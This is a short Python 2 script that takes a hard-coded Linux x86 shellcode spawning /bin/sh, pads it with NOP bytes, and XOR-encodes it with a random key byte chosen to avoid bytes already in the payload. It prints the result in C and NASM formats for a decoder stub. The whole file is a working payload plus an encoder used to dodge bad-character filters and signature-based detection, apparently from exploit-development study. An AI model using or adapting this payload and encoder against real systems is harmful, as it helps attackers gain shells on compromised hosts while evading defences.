#!/usr/bin/python2
import random 
import sys





shellcode =  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

shellcode = '\x90' + shellcode


#generate a list of all possible bytes 

bytez = bytearray.fromhex(''.join(['%02x' % i for i in range(1,256)]))

#get a list of bytes used by the shellcode 
shellarray = bytearray(shellcode)

padding = (len(shellarray) % 4)
shellcode += '\x90' * padding  
keys =  set(bytez) - set(shellarray)
keys = bytearray(keys)
#select a random key 
key = random.choice(keys)
print("=" *10)
print "decryption key: " ,  hex(key)

print("=" *10)

encoded = ""
encoded2 = ""

#encrypt the shellcode with the random byte-key

for x in bytearray(shellcode) :
    y = x ^ key
    encoded += '\\x'
    encoded += '%02x' % y
    encoded2 += '0x%02x,' %y

#print to screen the encoded shellcode in two formats 
print("=" *10)
print("C version:\n\n ")
print '"' + encoded + '"' + "\n"
print("=" *10)
print("NASM version\n\n")
print encoded2 + '0x%02x' % key + "\n"
print("=" *10)
print 'Len: %d' % len(bytearray(shellcode))


